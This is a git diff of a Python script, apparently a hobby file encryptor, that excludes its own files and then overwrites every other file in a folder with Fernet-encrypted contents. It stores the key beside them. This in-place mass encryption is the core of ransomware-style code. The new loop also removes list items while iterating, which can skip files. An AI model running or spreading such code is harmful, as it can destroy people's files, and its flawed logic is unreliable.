@@ -12,23 +12,32 @@ direc = os.listdir(folder)
 
 os.chdir(folder)
 
-for file in direc: #loops for all the files in the list
-    print(file)
+for file in direc:
+    if file == "Encrypt.py":
+        direc.remove("Encrypt.py")
+    if file == "README.md":
+        direc.remove("README.md")     
+    if file == "Decrypt.py":
+        direc.remove("Decrypt.py")  
+    if file == "cryptkey.key":
+        direc.remove("cryptkey.key")     
+    if file == "gitignore":
+        direc.remove("gitignore") 
 
-    if file == "Decrypt.py" or file == " Encrypt.py" or file == "README.md" or file == "cryptkey.key":
-        continue
-    if os.path.isfile(folder):
-        finalenc.appened(file)
+
+print(direc)
 
 key = Fernet.generate_key()
 
 with open("cryptkey.key", "wb") as cryptkey:
     cryptkey.write(key)
     
-for file in finalenc:
+    
+for file in direc:
+    print(file)
     with open(file, "rb") as thefile:
         contents = thefile.read()
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
-        
+
